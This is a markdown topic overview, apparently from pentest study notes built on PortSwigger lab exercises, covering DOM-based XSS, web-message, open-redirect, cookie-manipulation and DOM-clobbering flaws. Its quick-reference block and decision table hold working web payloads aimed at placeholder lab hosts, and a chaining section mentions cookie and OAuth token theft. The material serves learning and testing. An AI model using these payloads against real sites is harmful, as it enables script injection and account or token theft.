# DOM-based vulnerabilities — topic overview & router

DOM-based vulnerabilities arise when client-side JavaScript takes attacker-controlled data (a **source**) and passes it to a dangerous function (a **sink**) without sanitization. Unlike reflected/stored XSS where the server echoes input, DOM XSS happens entirely in the browser — the server response may be clean.

## 30-second quick reference

```
# Common sources
location.search / location.hash / location.href
document.referrer / window.name
postMessage events / WebSocket messages / cookie values

# Common sinks
innerHTML / document.write / eval / setTimeout(string)
location.href / location.assign / element.src
jQuery $() / $.ajax() / element.setAttribute('href',...)

# DOM XSS via postMessage (no origin check)
<iframe src="https://LAB/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">

# postMessage with JS URL sink (bypass string check)
this.contentWindow.postMessage('javascript:print()//http:','*')

# postMessage with JSON.parse + load-channel
this.contentWindow.postMessage('{"type":"load-channel","url":"javascript:print()}","*"')

# Open redirect via URL param
/post?postId=4&url=https://EXPLOIT-SERVER/

# Cookie manipulation (2-load iframe trick)
<iframe src="https://LAB/product?productId=1&'><script>print()</script>"
        onload="if(!window.x)this.src='https://LAB/';window.x=1;">

# DOM clobbering — clobber global var with anchor id
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

## Decision map

| Observation | Sub-technique | Attack |
|---|---|---|
| `addEventListener('message')` with no `event.origin` check | [Web-messages](Web-messages/) | iframe + postMessage with XSS payload |
| `location.href = message` with weak indexOf check | [Web-messages](Web-messages/) | `javascript:print()//http:` |
| JSON.parse + switch on `type` → iframe.src | [Web-messages](Web-messages/) | JSON with `"url":"javascript:print()"` |
| JS reads `url=` from location → sets `location.href` | [Open-redirection-and-cookie-manipulation](Open-redirection-and-cookie-manipulation/) | `/post?postId=4&url=https://COLLAB/` |
| Cookie value written to `lastViewedProduct` from URL, rendered on home page | [Open-redirection-and-cookie-manipulation](Open-redirection-and-cookie-manipulation/) | 2-load iframe poisoning product URL |
| JS: `window.defaultAvatar \|\| {avatar: '...'}` | [DOM-clobbering](DOM-clobbering/) | anchor id=defaultAvatar clobbering |
| HTML filter reads `attributes.length` | [DOM-clobbering](DOM-clobbering/) | `<input id=attributes>` clobbers property |

## Sub-technique folders
- `Web-messages/` — postMessage without origin check → XSS via innerHTML, JS URL sink, JSON.parse (3 labs)
- `Open-redirection-and-cookie-manipulation/` — taint flows to location.href or cookie → redirect/XSS (2 labs)
- `DOM-clobbering/` — HTML elements clobber JS globals/properties → bypass sanitizers, trigger XSS (2 labs)

## Root cause
JavaScript trusts data from browser-controlled sources (URL, postMessage, cookies) and passes it directly to dangerous sinks. The server-side response is irrelevant — the vulnerability lives in the client.

## Find it
1. View page source → search for `addEventListener('message'`, `location.search`, `location.hash`, `innerHTML`, `document.write`, `eval`.
2. Burp DOM Invader extension — automatically traces source→sink flows and highlights exploitable paths.
3. Burp Scanner flags many DOM sinks.
4. For postMessage: check if `event.origin` is validated; if absent or using weak `indexOf` → exploitable.
5. For DOM clobbering: look for `window.x || {prop: 'default'}` patterns; HTML named elements override JS globals.

## Chaining
- DOM XSS → cookie theft / credential capture → [Exploiting-XSS](../XSS/Exploiting-XSS/)
- Open redirect → OAuth token theft (fragment-based; attacker-controlled redirect URI steals code in URL)
- Open redirect + SSRF-like chaining → [SSRF](../SSRF/)
- Cookie manipulation → persistent XSS → stored payload on all future page visits

## Tools
- **Burp DOM Invader** — source→sink tracing in browser DevTools
- **Browser DevTools (Sources/Console)** — step through JS, set breakpoints on sinks
- **Exploit server** — host iframe payloads for delivery to victim

## References
- https://portswigger.net/web-security/dom-based
- https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
- https://portswigger.net/web-security/dom-based/dom-clobbering
